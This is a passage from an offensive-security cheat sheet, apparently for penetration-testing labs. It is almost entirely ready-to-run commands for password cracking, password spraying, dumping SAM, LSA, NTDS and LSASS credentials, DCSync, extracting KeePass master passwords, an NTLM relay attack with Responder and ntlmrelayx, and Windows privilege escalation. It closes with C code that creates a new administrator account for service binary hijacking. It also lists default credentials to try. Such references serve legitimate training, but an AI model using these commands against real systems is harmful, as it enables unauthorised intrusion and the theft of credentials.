> ```bash
> hydra -P <password_list> redis://<target_ip>
> ```
- ### Spraying passwords for RDP, one wordlist could be: /usr/share/wordlists/dirb/others/names.txt
> ```bash
> hydra -L <user_list> -p "<password>" rdp://<target_ip>
> ```

## John The Ripper

| **Description** | **Command** |
|-----------------|-------------|
| **Basic Cracking** | `john <password_file>` |
| **Show Cracked Passwords** | `john --show <password_file>` |
| **List Supported Hash Formats** | `john --list=formats` |
| **Resume Interrupted Cracking Session** | `john --restore` |
| **Use Wordlist for Dictionary Attack** | `john --wordlist=<wordlist_file> <password_file>` |
| **Incremental Mode (Brute Force)** | `john --incremental <password_file>` |
| **Use External Mode for Custom Cracking** | `john --external=<mode> <password_file>` |
| **Specify Hash Format for Optimization** | `john --format=<format> <password_file>` |
| **Verbose Mode for Detailed Output** | `john --verbose <password_file>` |
| **Extract Hash from Encrypted Office Files** | `office2john <file> > office.hash` |
| **Crack Office File Password** | `john --wordlist=<wordlist> office.hash` |
| **Extract Hashes from PDF Files** | `pdf2john <file.pdf> > pdf.txt` |
| **Crack PDF Password using John** | `john --wordlist=<wordlist> pdf.txt` |
| **Alternative PDF Password Cracking** | `pdfcrack -f <file.pdf> -w <wordlist>` |
| **Extract Hashes from ZIP Files** | `zip2john <file.zip> > zip.hash` |
| **Crack ZIP Password** | `john zip.hash --wordlist=<wordlist> --format=zip` |
| **Brute-Force ZIP Password (Alternative)** | `fcrackzip -u -D -p <wordlist> <file.zip>` |
| **Extract Hash from KeePass Database** | `keepass2john <Database.kdbx> > keepass.hash` |
| **Set Permissions for SSH Private Key** | `chmod 600 <id_rsa>` |
| **Convert SSH Key to John Format** | `ssh2john <id_rsa> > ssh.hash` |
| **Crack SSH Key Passphrase** | `john --wordlist=<password_list> --rules=<rules_file> ssh.hash` |

## Hashcat

| **No.** | **Command** |
|---------|-------------|
| **1. Basic Dictionary Attack** | `hashcat -m 0 -a 0 hashes.txt wordlist.txt` |
| **2. Brute Force Attack** | `hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a` |
| **3. Combination Attack** | `hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt` |
| **4. Rule-Based Attack** | `hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule` |
| **5. Hybrid Attack (Wordlist + Mask)** | `hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d` |
| **6. Specify Hash Type** | `hashcat -m 1000 hashes.txt wordlist.txt` |
| **7. Show Cracked Passwords** | `hashcat -m 0 hashes.txt --show` |
| **8. Benchmark Mode** | `hashcat -b` |
| **9. Session Management** | `hashcat -m 0 -a 0 hashes.txt wordlist.txt --session=mysession` |
| **10. Resume Session** | `hashcat --session=mysession --restore` |
| **11. Increment Mode** | `hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a --increment` |
| **12. Custom Character Set** | `hashcat -m 0 -a 3 hashes.txt -1 ?l?u?d custom_mask.txt` |
| **13. Output to File** | `hashcat -m 0 -a 0 hashes.txt wordlist.txt -o cracked.txt` |
| **14. Remove Cracked Hashes** | `hashcat -m 0 hashes.txt --show --left` |
| **15. Help and Usage Information** | `hashcat -h`<br>Alternative usage: `hashcat --help` |

---

## Keepass

1. ### Search for KeePass database (.kdbx) on Windows
> ```powershell
> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
> ```
2. Cracking KeePass Database
- ### Convert KeePass database to John format
> ```bash
> keepass2john <Database.kdbx> > keepass.hash
> # Remember to delete the first "'word':" that says 'Database:'; it should look like this:
> # $keepass$*2*60*0*d7bfhs83hFTG338717d27a7d4sucgd54fvfv486d2...... INSTEAD OF Database:$keepass$*2*60*0*d7bfhs83hFTG338717d27a7d4sucgd54fvfv486d2......
> # Crack KeePass hash using Hashcat (the rule is optional)
> hashcat -m 13400 keepass.hash <wordlist> -r <rule_file> --force
> ```
3. Opening KeePass Database (after cracking it)
- ### Open the tool
> ```bash
> kpcli --kdb=Database.kdbx
> # Navigate to the desired database and folder with cd [folder]
> cd Database/
> # Show contents of database
> ls
> # Show entries information
> show [-f] [-a] <entry_id or entry_path>
> # Show a specific field detail of an entry: (example) get 'BACKUP Machine SSH Key' Pass or get 0 Pass
> get <entry_path or entry_id> <field_name>
> ```

---

## Common Credentials

| **Description**                              | **Credentials**             |
|----------------------------------------------|-----------------------------|
| **Default root credentials**                 | root:root                   |
| **Common admin credentials for email accounts** | admin@example.com:admin    |
| **Standard admin/admin credentials**         | admin:admin                 |
| **Credentials matching the box name (e.g., a target machine's name)** | USERK:USERK                |
| **Credentials found using exiftool or similar methods** | cassie:cassie              |
| **Standard admin/password credentials**      | admin:password              |
| **Admin credentials with simple numeric password** | admin:1234               |
| **Default admin credentials for Windows systems** | administrator:admin     |
| **Common admin credentials with variations** | admin:admin123             |
| **Default guest credentials for various systems** | guest:guest               |
| **Basic user credentials**                   | user:user                   |
| **Test account credentials**                 | test:test                   |
| **Default support account credentials**      | support:support             |
| **Common manager credentials**               | manager:manager             |
| **Default operator credentials**             | operator:operator           |
| **Default service account credentials**      | service:service             |
| **Default PostgreSQL credentials**           | postgres:postgres           |
| **Default MySQL credentials**                | mysql:mysql                 |

---

## Crackmapexec

| **Description**                                | **Command**                                                                                                    |
|------------------------------------------------|----------------------------------------------------------------------------------------------------------------|
| **1. Basic SMB Enumeration**                   | `crackmapexec smb <target>`                                                                                   |
| **2. Credential Validation**                   | `crackmapexec smb <target> -u <username> -p <password>`                                                        |
| **3. Pass-the-Hash Authentication**            | `crackmapexec smb <target> -u <username> -H <ntlm_hash>`                                                      |
| **4. Credential Spray Attack**                 | `crackmapexec smb <target> -u users.txt -p <password>`                                                        |
| **5. Password Spray Attack**                   | `crackmapexec smb <target> -u users.txt -p passwords.txt`                                                     |
| **6. Execute Commands**                        | `crackmapexec smb <target> -u <username> -p <password> -x "whoami"`                                           |
| **7. Execute PowerShell Commands**             | `crackmapexec smb <target> -u <username> -p <password> -X "Get-Process"`                                      |
| **8. Dump SAM Database**                       | `crackmapexec smb <target> -u <username> -p <password> --sam`                                                 |
| **9. Dump LSA Secrets**                        | `crackmapexec smb <target> -u <username> -p <password> --lsa`                                                 |
| **10. Dump NTDS.dit**                          | `crackmapexec smb <target> -u <username> -p <password> --ntds`                                                |
| **11. Enumerate Shares**                       | `crackmapexec smb <target> -u <username> -p <password> --shares`                                              |
| **12. Enumerate Logged Users**                 | `crackmapexec smb <target> -u <username> -p <password> --sessions`                                            |
| **13. Enumerate Local Users**                  | `crackmapexec smb <target> -u <username> -p <password> --users`                                               |
| **14. Enumerate Local Groups**                 | `crackmapexec smb <target> -u <username> -p <password> --groups`                                              |
| **15. Enumerate Domain Users**                 | `crackmapexec ldap <target> -u <username> -p <password> --users`                                              |
| **16. Spider Shares**                          | `crackmapexec smb <target> -u <username> -p <password> -M spider_plus`                                        |
| **17. Execute Mimikatz Module**                | `crackmapexec smb <target> -u <username> -p <password> -M mimikatz`                                           |
| **18. BloodHound Data Collection**             | `crackmapexec ldap <target> -u <username> -p <password> -M bloodhound`                                        |
| **19. WinRM Command Execution**                | `crackmapexec winrm <target> -u <username> -p <password> -x "hostname"`                                       |
| **20. MSSQL Query Execution**                  | `crackmapexec mssql <target> -u <username> -p <password> -q "SELECT @@version"`                              |
| **21. List Available Modules**                 | `crackmapexec smb -L`                                                                                         |
| **22. Subnet Scanning**                        | `crackmapexec smb 192.168.1.0/24`                                                                             |
| **23. Continue on Success**                    | `crackmapexec smb <target> -u users.txt -p passwords.txt --continue-on-success`                               |

**Examples**

| **Command**                        | **Example Usage**                                                               | **Function**                                        | **Output Example**                                                                                       |
|------------------------------------|----------------------------------------------------------------------------------|----------------------------------------------------|-----------------------------------------------------------------------------------------------------------|
| **Basic Enumeration**              | `crackmapexec smb <IP Address>`                                                  | Enumerates SMB information.                        | `SMB <IP Address> 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)` |
| **Valid Credentials**              | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd`                            | Validates credentials.                             | `SMB <IP Address> 445 DC01 [+] CORP.LOCAL\admin:P@ssw0rd (Pwn3d!)`                                       |
| **Invalid Credentials**            | `crackmapexec smb <IP Address> -u admin -p WrongPass`                           | Tests invalid credentials.                         | `SMB <IP Address> 445 DC01 [-] CORP.LOCAL\admin:WrongPass STATUS_LOGON_FAILURE`                          |
| **Pass-the-Hash**                  | `crackmapexec smb <IP Address> -u admin -H fc525c9683e8fe067095ba2ddc971889`     | Authenticates with hash.                           | `SMB <IP Address> 445 DC01 [+] CORP.LOCAL\admin fc525c9683e8fe067095ba2ddc971889 (Pwn3d!)`                |
| **Password Spray**                 | `crackmapexec smb <IP Address> -u users.txt -p Password123`                     | Sprays password across users.                      | `SMB <IP Address> 445 DC01 [+] CORP.LOCAL\john:Password123`                                              |
| **Command Execution**              | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd -x whoami`                  | Executes command remotely.                         | `SMB <IP Address> 445 DC01 [+] CORP.LOCAL\admin:P@ssw0rd (Pwn3d!)`                                       |
| **PowerShell Exec**                | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd -X "Get-Host"`               | Executes PowerShell command.                       | `SMB <IP Address> 445 DC01 Name : ConsoleHost Version : 5.1.17763.1007`                                 |
| **Dump SAM**                       | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd --sam`                      | Dumps SAM database.                                | `SMB <IP Address> 445 DC01 [+] Dumping SAM hashes Administrator:500:aad3b435b51404ee...`                 |
| **Dump LSA**                       | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd --lsa`                      | Extracts LSA secrets.                              | `SMB <IP Address> 445 DC01 [+] Dumping LSA secrets CORP.LOCAL\svc_backup:$DCC2$...`                       |
| **Dump NTDS**                      | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd --ntds`                     | Extracts domain hashes.                            | `SMB <IP Address> 445 DC01 [+] Dumping NTDS.dit Administrator:500:aad3b435b51404ee...`                   |
| **Enumerate Shares**               | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd --shares`                   | Lists SMB shares.                                  | `SMB <IP Address> 445 DC01 ADMIN$ Disk Remote Admin SMB <IP Address> 445 DC01 C$ Disk Default share`      |
| **Logged Users**                   | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd --sessions`                 | Shows logged-in users.                             | `SMB <IP Address> 445 DC01 CORP.LOCAL\john (Active: 2h 15m) SMB <IP Address> 445 DC01 CORP.LOCAL\admin`    |
| **Local Users**                    | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd --users`                    | Lists local users.                                 | `SMB <IP Address> 445 DC01 Administrator SMB <IP Address> 445 DC01 Guest`                                 |
| **Local Groups**                   | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd --groups`                   | Lists local groups.                                | `SMB <IP Address> 445 DC01 Administrators SMB <IP Address> 445 DC01 Remote Desktop Users`                  |
| **Domain Users**                   | `crackmapexec ldap <IP Address> -u admin -p P@ssw0rd --users`                   | Enumerates AD users.                               | `LDAP <IP Address> 389 DC01 john.doe LDAP <IP Address> 389 DC01 jane.smith`                               |
| **Spider Module**                  | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd -M spider_plus`             | Spiders shares for files.                          | `SMB <IP Address> 445 DC01 [+] Found: \\<IP Address>\Share\passwords.txt`                                 |
| **Mimikatz Module**                | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd -M mimikatz`                | Executes Mimikatz.                                  | `SMB <IP Address> 445 DC01 [+] john : P@ssw0rd123 SMB <IP Address> 445 DC01 [+] admin : SuperSecret!`     |
| **BloodHound**                      | `crackmapexec ldap <IP Address> -u admin -p P@ssw0rd -M bloodhound`             | Collects BloodHound data.                          | `LDAP <IP Address> 389 DC01 [+] Collecting data for BloodHound LDAP <IP Address> 389 DC01 [+] Data saved to: bloodhound_data.zip` |
| **WinRM Execution**                 | `crackmapexec winrm <IP Address> -u admin -p P@ssw0rd -x hostname`              | Uses WinRM for execution.                          | `WINRM <IP Address> 5985 DC01 [+] CORP.LOCAL\admin:P@ssw0rd (Pwn3d!) WINRM <IP Address> 5985 DC01 DC01`     |
| **MSSQL Query**                     | `crackmapexec mssql <IP Address> -u sa -p P@ssw0rd -q "SELECT @@version"`       | Executes SQL query.                                | `MSSQL <IP Address> 1433 SQL01 Microsoft SQL Server 2019 (RTM) - 15.0.2000.5`                             |
| **List Modules**                    | `crackmapexec smb -L`                                                            | Lists available modules.                           | `[*] mimikatz Executes Mimikatz [*] spider_plus Spiders shares for files [*] bloodhound Collects data for BloodHound` |
| **Subnet Scan**                     | `crackmapexec smb <IP Address>/24`                                               | Scans entire subnet.                               | `SMB <IP Address> 445 DC01 [*] Windows 10.0 Build 17763 SMB <IP Address> 445 SQL01 [*] Windows Server 2019` |
| **Continue Success**                 | `crackmapexec smb <IP Address> -u users.txt -p Pass123 --continue-on-success`    | Continues after success.                           | `SMB <IP Address> 445 DC01 [+] CORP.LOCAL\john:Pass123 SMB <IP Address> 445 DC01 [+] CORP.LOCAL\jane:Pass123` |
| **Admin Check**                     | `crackmapexec smb <IP Address> -u admin -p P@ssw0rd`                            | Checks for admin access.                           | `SMB <IP Address> 445 DC01 [+] CORP.LOCAL\admin:P@ssw0rd (Pwn3d!)`                                        |
| **Gen Relay List**                  | `crackmapexec smb <IP Address>/24 --gen-relay-list targets.txt`                  | Generates relay target list.                       | `[+] Generating relay list... [+] 5 targets saved to targets.txt`                                         |

---

## Netexec

**Enumeration**

| **Command**                             | **Example Usage**                                                                 | **Function**                            |
|-----------------------------------------|------------------------------------------------------------------------------------|----------------------------------------|
| **Initial Enumeration**                 | `netexec smb <target>`                                                            | Performs basic SMB enumeration.        |
| **Null Authentication**                 | `netexec smb <target> -u '' -p ''`                                                 | Attempts SMB null authentication.      |
| **Guest Authentication**                | `netexec smb <target> -u 'guest' -p ''`                                           | Attempts SMB guest authentication.     |
| **List Shares**                         | `netexec smb <target> -u '' -p '' --shares`                                        | Lists available SMB shares.            |
|                                         | `netexec smb <target> -u [username] -p [password] --shares`                        | Lists SMB shares with valid credentials.|
|                                         | `netexec smb <target> --shares --policies`                                         | Lists shares and their associated policies.|
| **List Groups**                         | `netexec smb <target> --groups`                                                   | Lists SMB groups on the target.        |
| **List Usernames**                      | `netexec smb <target> -u '' -p '' --users`                                         | Lists SMB users with null credentials. |
|                                         | `netexec smb <target> -u [username] -p [password] --users`                         | Lists SMB users with valid credentials.|
|                                         | `netexec smb <target> -u '' -p '' --rid-brute`                                     | Attempts RID brute force on SMB users. |
|                                         | `netexec smb <target> -u '' -p '' --rid-brute --rid-range 500-1100`                | Brute forces a range of RIDs.          |


## Password Spraying

| **Command**                                                        | **Example Usage**                                                                                               | **Function**                                                                      |
|--------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------|
| **Password Formatting for Special Characters**                     | `netexec smb <target> -u [username] -p '[P@$$w0rd!]'`                                                             | Format passwords with special characters in single quotes to avoid shell issues. |
|                                                                    | `netexec smb <target> -u [username] -p 'password with spaces'`                                                    | Formats passwords with spaces in single quotes.                                  |
| **Password Spraying**                                              | `netexec [protocol] [target(s)] -u [usernames].txt -p [passwords].txt`                                            | Uses a list of usernames and passwords for password spraying.                    |
|                                                                    | `netexec [protocol] [target(s)] -u [usernames].txt -p [passwords].txt --local-auth`                               | Password spraying with local authentication.                                    |
|                                                                    | `netexec [protocol] [target(s)] -u username1 -p password1 password2`                                             | Specify multiple passwords to try.                                              |
|                                                                    | `netexec [protocol] [target(s)] -u username1 username2 -p password1`                                            | Use multiple usernames and a single password.                                   |
| **Using NTLM Hashes**                                              | `netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt`                                          | Use NTLM hashes for authentication.                                             |
|                                                                    | `netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt --local-auth`                            | Authenticate with NTLM hashes and use local authentication.                     |
| **SMB Specific**                                                   | `netexec smb <target> -u [usernames].txt -p [password] --continue-on-success`                                    | SMB password spraying with continue-on-success.                                 |
|                                                                    | `netexec smb <target> -u [usernames].txt -p [passwords].txt --no-bruteforce --continue-on-success`               | SMB password spraying without brute-forcing.                                    |
| **SSH**                                                            | `netexec ssh <target> -u [username] -p [password] --continue-on-success`                                         | SSH password spraying with continue-on-success.                                 |
| **Password Spraying Without Bruteforce**                           | `netexec [protocol] [target(s)] -u [usernames].txt -p [passwords.txt] --no-bruteforce`                           | Password spraying without brute-force, useful for protocols like WinRM and MSSQL.|
|                                                                    | `netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt --no-bruteforce`                         | Password spraying with NTLM hashes without brute-force.                         |
| **Local Authentication**                                           | `netexec smb <target> -u [username] -p '[password]' --local-auth`                                                | Local authentication with a password.                                           |
|                                                                    | `netexec smb <target> -u [username] -H '[LM:NT]' --local-auth`                                                  | Local authentication using LM and NT hashes.                                   |
|                                                                    | `netexec smb <target> -u [username] -H '[NTHASH]' --local-auth`                                                 | Local authentication with NTHASH.                                               |
| **Using Kerberos**                                                 | `netexec smb <target> -u [username] -p [password] -k`                                                            | Use Kerberos tickets for authentication when suspected available.               |

**Other Useful Commands**

| **Command**                                                      | **Example Usage**                                                                 | **Function**                                                                 |
|------------------------------------------------------------------|------------------------------------------------------------------------------------|-----------------------------------------------------------------------------|
| **SMB Commands**                                                 |                                                                                    |                                                                             |
| **All In One**                                                   | `netexec smb <target> -u [username] -p [password] --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol` | Runs multiple SMB enumeration and information gathering options.            |
| **Spider_plus Module**                                           | `netexec smb <target> -u [username] -p [password] -M spider_plus`                  | Runs the Spider_plus module to search SMB shares for files.                  |
| **List Shares**                                                  | `netexec smb <target> -u '' -p '' --shares`                                       | Lists SMB shares on the target.                                              |
| **List Shares (With Authentication)**                            | `netexec smb <target> -u [username] -p [password] --shares`                        | Lists SMB shares after authenticating.                                       |
| **List Shares (With Policies)**                                  | `netexec smb <target> --shares --policies`                                        | Lists SMB shares with policies.                                             |
| **List Groups**                                                  | `netexec smb <target> --groups`                                                   | Lists SMB groups on the target system.                                       |
| **List Usernames**                                               | `netexec smb <target> -u '' -p '' --users`                                        | Lists usernames on the target system.                                       |
| **List Usernames (With Authentication)**                         | `netexec smb <target> -u [username] -p [password] --users`                         | Lists usernames after authenticating.                                        |
| **RID Brute Force**                                              | `netexec smb <target> -u '' -p '' --rid-brute`                                    | Performs RID brute forcing on the target.                                    |
| **RID Brute Force (With Range)**                                 | `netexec smb <target> -u '' -p '' --rid-brute --rid-range 500-1100`                | Performs RID brute forcing with a specified range.                           |
| **FTP Commands**                                                 |                                                                                    |                                                                             |
| **List Folders and Files**                                       | `netexec ftp <target> -u [username] -p [password] --ls`                            | Lists folders and files in the FTP server.                                   |
| **List Files Inside a Folder**                                   | `netexec ftp <target> -u [username] -p [password] --ls folder_name`                | Lists files inside a specific folder on the FTP server.                      |
| **Retrieve a Specific File**                                     | `netexec ftp <target> -u [username] -p [password] --ls folder_name --get file_name` | Retrieves a specific file from a folder on the FTP server.                   |
| **MSSQL Commands**                                               |                                                                                    |                                                                             |
| **Authentication**                                               | `netexec mssql <target> -u [username] -p [password]`                               | Authenticates to an MSSQL server with a given username and password.         |
| **Execute Commands Using xp_cmdshell**                           | `netexec mssql <target> -u [username] -p [password] -x [command_to_execute]`      | Executes a command on an MSSQL server using xp_cmdshell.                     |
| **Get a File**                                                   | `netexec mssql <target> -u [username] -p [password] --get-file output_file target_file` | Downloads a file from the MSSQL server.                                     |
| **LDAP Commands**                                                |                                                                                    |                                                                             |
| **Enumerate Users Using LDAP**                                   | `netexec ldap <target> -u '' -p '' --users`                                       | Enumerates users in the LDAP directory.                                      |
| **All In One (LDAP)**                                            | `netexec ldap <target> -u [username] -p [password] --trusted-for-delegation --[password]-not-required --admin-count --users --groups` | Runs multiple LDAP enumeration options.                                      |
| **Kerberoast**                                                   | `netexec ldap <target> -u [username] -p [password] --kerberoasting kerb.txt`      | Performs Kerberoasting to extract service tickets from Active Directory.     |
| **ASREProast**                                                   | `netexec ldap <target> -u [username] -p [password] --asreproast asrep.txt`        | Performs ASREProast to extract TGTs for password hashes from Active Directory.|
| **BloodHound**                                                   | `netexec ldap <target> -u [username] -p [password] -M bloodhound`                 | Collects BloodHound data from Active Directory for analysis.                 |
| **Authentication (LDAP)**                                        | `netexec ldap <target> -u [username] -p [password]`                               | Authenticates to an LDAP server with a given username and password.          |

## Secrets Dump

| **Command**                                        | **Example Usage**                                                                                                    | **Function**                        |
|----------------------------------------------------|------------------------------------------------------------------------------------------------------------------------|-------------------------------------|
| **Dump SAM**                                       | `nxc smb <target> -u [username] -p [password] --sam`                                                                   | Dumps SAM hashes.                   |
| **Dump LSA Secrets**                               | `netexec smb <target> -u [username] -p [password] --local-auth --lsa`                                                  | Dumps LSA secrets.                  |
| **Dump NTDS.dit**                                  | `netexec smb <target> -u [username] -p [password] --ntds`                                                              | Dumps NTDS.dit (AD hashes).         |
| **Dump LSASS**                                     |                                                                                                                        |                                     |
| **Using Lsassy**                                   | `nxc smb <target> -u [username] -p [password] -M lsassy`                                                                | Dumps LSASS creds with Lsassy.      |
| **Using Nanodump**                                 | `nxc smb <target> -u [username] -p [password] -M nanodump`                                                              | Dumps LSASS creds with Nanodump.    |
| **Using Mimikatz (Deprecated)**                    | `nxc smb <target> -u [username] -p [password] -M mimikatz -o COMMAND='"lsadump::dcsync /domain:domain.local /user:krbtgt"'` | Dumps LSASS creds or DCSync.        |
| **gMSA**                                           |                                                                                                                        |                                     |
| **Convert gMSA ID**                                | `netexec ldap <target> -u [username] -p [password] --gmsa-convert-id id`                                               | Converts gMSA ID.                   |
| **Decrypt gMSA LSA Secrets**                       | `netexec ldap <domain> -u [username] -p [password] --gmsa-decrypt-lsa gmsa_account`                                    | Decrypts gMSA LSA secrets.         |
| **Group Policy Preferences (GPP)**                 | `netexec smb <target> -u [username] -p [password] -M gpp_[password]`                                                   | Dumps GPP passwords.                |
| **Dump LAPS v1 and v2 Passwords**                  | `netexec smb <target> -u [username] -p [password] --laps`                                                               | Dumps LAPS passwords.               |
| **Dump DPAPI Credentials**                         | `netexec smb <target> -u [username] -p [password] --laps --dpapi`                                                       | Dumps DPAPI credentials.            |
| **Dump WiFi Credentials**                          | `netexec smb <target> -u [username] -p [password] -M wifi`                                                              | Dumps WiFi credentials.             |
| **Dump KeePass**                                   |                                                                                                                        |                                     |
| **Discover KeePass Installation**                  | `nxc smb <target> -u [username] -p [password] -M keepass_discover`                                                      | Discovers KeePass installation.     |
| **Trigger KeePass for Master Password Extraction** | `nxc smb <target> -u [username] -p [password] -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"`   | Extracts KeePass master password.   |


**Other Useful Models**

| **Command**                                      | **Example Usage**                                                                                                  | **Function**                                   |
|--------------------------------------------------|----------------------------------------------------------------------------------------------------------------------|------------------------------------------------|
| **Webdav**                                       | `netexec smb <IP Address> -u [username] -p [password] -M webdav`                                                     | Checks if the WebClient service is running.    |
| **Veeam**                                        | `netexec smb <target> -u [username] -p [password] -M veeam`                                                          | Extracts credentials from Veeam SQL Database.  |
| **Slinky**                                       | `netexec smb <IP Address> -u [username] -p [password] -M slinky`                                                     | Creates Windows shortcuts with UNC path.       |
| **NTDSutil**                                     | `netexec smb <IP Address> -u [username] -p [password] -M ntdsutil`                                                   | Dumps NTDS using ntdsutil.                    |
| **LDAP-Checker**                                 | `netexec ldap <target> -u [username] -p [password] -M ldap-checker`                                                  | Checks if LDAP signing and binding are required. |
| **Zerologon**                                    | `netexec smb <target> -u [username] -p [password] -M zerologon`                                                     | Checks if the DC is vulnerable to Zerologon.   |
| **PetitPotam**                                   | `netexec smb <target> -u [username] -p [password] -M petitpotam`                                                    | Checks if the DC is vulnerable to PetitPotam.  |
| **Nopac**                                        | `netexec smb <target> -u [username] -p [password] -M nopac`                                                         | Checks if the DC is vulnerable to NOPAC.       |
| **MachineAccountQuota**                          | `netexec ldap <target> -u [username] -p [password] -M maq`                                                          | Checks the MachineAccountQuota.                |
| **ADCS Enumeration**                             | `netexec ldap <target> -u [username] -p [password] -M adcs`                                                         | Performs ADCS enumeration.                     |
| **Retrieve MSOL Account Password**               | `netexec smb <target> -u [username] -p [password] -M msol`                                                          | Retrieves MSOL account password.               |

---

## NTLM relay attack

1. Check for hosts that have SMB signing disabled, and if so capture the NTLM and perform an NTLM Relay Attack:

       Identify if Host is Vulnerable:

> ```bash
> netexec smb [target(s)] --gen-relay-list relay.txt
> 
> # Alternative with Nmap
> nmap --script smb-security-mode.nse,smb2-security-mode.nse -p445 [target(s)]
> ```

### Expected Results
SMB         192.168.1.101    445    DC2012A          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012A) (domain:OCEAN) (signing:True) (SMBv1:True)
SMB         192.168.1.102    445    DC2012B          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012B) (domain:EARTH) (signing:True) (SMBv1:True)
SMB         192.168.1.111    445    SERVER1          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SERVER1) (domain:PACIFIC) (signing:False) (SMBv1:True)
SMB         192.168.1.117    445    WIN10DESK1       [*] WIN10DESK1 x64 (name:WIN10DESK1) (domain:OCEAN) (signing:False) (SMBv1:True)
...SNIP...

> ```bash
> cat relay_list.txt
> 192.168.1.111
> 192.168.1.117
> ```

2. Start Responder Server

> ```bash
> sudo responder -I eth0
> ```

3. Perform Relay Attack: by using the captured hashes in Responder (if applicable).

> ```bash
> impacket-ntlmrelayx -tf relay.txt -smb2support
> ```

4. Perform Actions on Objective: access shares or execute commands or do pass-the-hash attacks or try to crack the NTLM hash, this is now whatever you want to do.

---

## Escalation

## Windows

**Basic Commands**

| **Command**                                                             | **Example Usage**                                                                                              |
|-------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------|
| **Displays current user and hostname**                                  | `whoami`                                                                                                       |
| **Lists all local users**                                               | `Get-LocalUser`                                                                                                 |
| **Lists all local groups**                                              | `Get-LocalGroup`                                                                                               |
| **Lists local group members**                                           | `Get-LocalGroupMember -GroupName [GroupName]`                                                                   |
| **Displays detailed OS information**                                    | `systeminfo`                                                                                                   |
| **Displays detailed network configuration**                              | `ipconfig /all`                                                                                               |
| **Shows routing table**                                                 | `route print`                                                                                                  |
| **Displays network connections and listening ports**                    | `netstat -ano`                                                                                                 |
| **Lists installed 32-bit applications**                                 | `Get-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"`             |
| **Filters to show only application names**                              | `Select-Object -Property DisplayName`                                                                           |
| **Lists installed 64-bit applications**                                 | `Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"`                         |
| **Lists all running processes**                                         | `Get-Process`                                                                                                  |
| **Displays process names and paths**                                    | `Select-Object -Property ProcessName, Path`                                                                    |
| **Lists services and their associated accounts**                        | `Get-WmiObject -Class Win32_Service | Select-Object Name, StartName`                                           |
| **Displays scheduled tasks and their status**                           | `Get-ScheduledTask | Select-Object TaskName, TaskPath, State`                                                   |
| **Lists members of the local Administrators group**                     | `Get-LocalGroupMember -GroupName "Administrators"`                                                             |
| **Shows all drives and mounted volumes, including network shares**      | `Get-PSDrive -PSProvider FileSystem`                                                                            |
| **Displays the version of PowerShell in use**                           | `$PSVersionTable.PSVersion`                                                                                   |
| **Enumerates everything the Users folder has**                          | `Get-ChildItem -Path C:\Users\ -Include *.* -File -Recurse -ErrorAction SilentlyContinue`                       |
| **Searching for Password Manager Databases**                            | `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`                         |
| **Searching for sensitive information in the XAMPP directory**          | `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`               |
| **Finding unusual files and directories**                               | `Get-ChildItem -Path C:\Users -Include *.bak,*.old,*.tmp -File -Recurse -ErrorAction SilentlyContinue`          |
| **Finding files with SYSTEM or Administrators group permissions**       | `Get-ChildItem -Path [Path] -File -Recurse | Where-Object { (Get-Acl $_.FullName).Access | Where-Object { $_.IdentityReference -like "*SYSTEM*" -or $_.IdentityReference -like "*Administrators*" }}` |
| **Finding large files**                                                | `Get-ChildItem -Path [Path] -File -Recurse | Where-Object { $_.Length -gt [SizeInBytes] } | Select-Object FullName, Length`                       |
| **Finding executable files**                                            | `Get-ChildItem -Path C:\Users -Include *.exe,*.bat,*.ps1 -File -Recurse -ErrorAction SilentlyContinue`          |
| **Finding directories writable by all users**                           | `Get-ChildItem -Path [Path] -Directory -Recurse | Where-Object { (Get-Acl $_.FullName).Access | Where-Object { $_.FileSystemRights -like "*Write*" -and $_.IdentityReference -like "*Users*" }}` |
| **Using Runas to execute CMD as a different user**                      | `runas /user:[Domain\Username] cmd`                                                                              |

**Service Binary Hijacking**

1. Check Running Services
### Tip: Look for services with paths outside of `system32` or other unexpected locations.; try to find that thing that seems out of place.
> ```powershell
> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -eq 'Running'}
> ```

2. Review Permissions of a Service
> ```cmd
> icacls "C:\Path\To\ServiceBinary.exe"
> ```

3. Obtain Startup Type of a Service
> ```powershell
> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -eq '<ServiceName>'}
> ```

4. Creating an Executable That Adds a New Administrator User
> ```c
> #include <stdlib.h>
>
> int main ()
> {
>   system("net user emma Password123! /add");
>   system("net localgroup administrators emma /add");
>   return 0;
> }
> ```
> ### Cross-Compile the C Code to a 64-bit Application
> ```bash
